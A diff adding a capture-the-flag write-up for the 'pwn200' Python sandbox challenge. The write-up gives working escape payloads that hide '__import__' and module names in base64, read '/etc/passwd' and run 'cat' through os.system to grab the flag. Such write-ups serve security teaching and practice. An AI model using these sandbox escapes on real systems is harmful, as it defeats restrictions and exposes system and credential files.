@@ -65,3 +65,63 @@ The flag is `flag{python_sandboxing:_harder_than_teaching_your_mom_dota}`.
 
 * <http://sugarstack.io/tinyctf-exp200/>
 * [_Escaping Python sandboxes_](https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/)
+
+
+Un-zip [the provided `pwn200.zip` file](pwn200.zip):
+
+```bash
+$ unzip pwn200.zip
+Archive:  pwn200.zip
+  inflating: pwn200
+```
+
+The extracted `pwn200` file is a Python script.
+
+```bash
+$ python pwn200
+
+Welcome to Safe Interactive CPython Shell (SICS)
+================================================
+
+Rules:
+    - Wash your dishes
+    - Don't eat the yellow snow
+    - Do not import anything
+    - No peeking at files!
+
+baby@sics:~$
+1 + 1
+2
+baby@sics:~$
+open('/home/pybaby/flag.txt')
+...
+...
+...
+
+```
+
+Well, we can't do anything 'normal' time for some 'exotic' code (-;
+
+```python
+# Well, let's try to import a library:
+# X19pbXBvcnRfXw== is __import__ 
+# c2h1dGls is shutil
+__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('c2h1dGls'.decode('base64')).copyfile('/etc/passwd', '/proc/self/fd/0')
+# Doing so on our local box
+
+python pwn200
+>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('c2h1dGls'.decode('base64')).copyfile('/etc/passwd', '/proc/self/fd/0')
+# BOOM! The password file... Okay, so this should work right?!
+
+Nope... A socket dup'd fd doesn't like to be used like this...so back to the drawing board...
+
+# Well, let's try to import a library again and use a system command:
+# X19pbXBvcnRfXw== is __import__
+# b3M= is os
+__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system("cat /home/pybaby/*.txt")
+
+MONEY!!!
+
+```
+
+The flag is `flag{python_sandboxing:_harder_than_teaching_your_mom_dota}`.
